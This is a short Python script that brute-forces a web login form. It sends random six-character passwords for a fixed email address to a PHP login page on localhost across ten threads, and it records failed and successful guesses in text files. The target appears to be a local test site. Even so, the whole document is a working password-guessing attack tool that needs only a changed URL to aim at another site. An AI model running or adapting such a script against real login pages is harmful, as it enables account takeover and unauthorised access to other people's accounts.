import requests
import random
import threading
import os 

url ="http://localhost/TestWebSite/submit_login.php"

def send_request(requestEmail, RequestPassword):
    data = {
        'email': requestEmail,
        'password': RequestPassword
    }
    # print(data)

    r = requests.post(url, data = data)
    return r
    # print(r.text)

# send_request('test@test.com','123456')

chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
def main():
    email = "test@test.com"
    while True:
        if os.path.getsize('correct_password.txt') != 0 :
            break
        valid = False
        while not valid:
            rndPasswd = random.choices(chars, k = 6)
            passwd = "".join(rndPasswd)
            file = open('incorrect_password.txt','r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True

        r = send_request(email, passwd)

        if "login successful" in r.text.lower():
            print(f"Correct password : {passwd} !\n")
            with open('correct_password.txt','a') as f:
                f.write(f"{passwd}\n")
                f.close()
            break
        else:
            print(f"Invalid password : {passwd} !\n")
            with open('incorrect_password.txt','a') as f:
                f.write(f"{passwd}\n")
                f.close()


for _ in range(10):
    threading.Thread(target = main).start()